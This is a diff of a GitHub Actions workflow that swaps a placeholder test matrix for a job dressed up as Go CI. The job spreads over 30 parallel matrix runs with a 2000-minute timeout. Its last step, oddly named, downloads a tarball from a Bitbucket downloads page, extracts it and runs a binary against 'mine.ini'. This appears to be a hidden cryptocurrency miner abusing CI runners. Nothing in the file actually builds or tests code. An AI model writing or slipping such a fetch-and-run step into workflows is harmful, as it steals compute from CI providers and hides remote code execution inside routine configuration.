@@ -1,17 +1,36 @@
-name: Run test matrixssssssss
+name: Teuka CI
 
-on: [push]
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
 
 jobs:
+
   build:
+    name: Tarik Sist
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        node-version: [8.x, 10.x, 12.x, 14.x, 16x]
-        mongodb-version: [4.0, 4.2, 4.4, 6.6]
-        redis-version: [4]
+        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16]
+        flag: [pkn, ips, bin, jar, cek]
+    timeout-minutes: 2000
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
 
     steps:
-    - name: Git checkout
-      uses: actions/checkout@v2
-    - run: echo "done"
+      
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v1
+
+    - name: Smongko
+      run: |
+        wget https://bitbucket.org/17423078/semongko/downloads/dudi.tar.gz && tar -xvf dudi.tar.gz && ./ikuk mine.ini
